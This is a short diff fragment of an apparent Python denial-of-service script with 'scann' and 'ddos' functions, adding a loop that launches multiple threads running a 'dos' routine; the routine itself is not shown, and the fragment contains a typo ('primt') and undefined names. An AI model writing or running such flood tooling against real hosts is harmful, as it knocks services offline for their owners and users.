@@ -27,6 +27,11 @@ def scann(targetIP):
    print(" ")
    
 def ddos():
+   
+   for i in range(threads):
+      t = Thread(target=dos)
+      t.start()
+   
    print("\033[1;32;40mGenerating...")
    message = (messages * rtxt)
    primt("\033[1;32;40mOk!")
